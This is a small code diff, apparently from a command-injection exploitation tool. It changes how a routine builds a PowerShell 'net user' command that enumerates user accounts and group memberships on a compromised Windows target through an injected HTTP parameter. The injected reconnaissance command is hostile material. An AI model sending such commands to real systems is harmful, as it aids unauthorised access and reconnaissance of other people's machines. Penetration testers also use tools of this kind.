@@ -174,7 +174,7 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
       for user in range(0, len(sys_users_list)):
         count = count + 1
         if menu.options.privileges:
-          cmd = "powershell.exe write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
+          cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
           if alter_shell:
             cmd = cmd.replace("'","\\'")
           response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
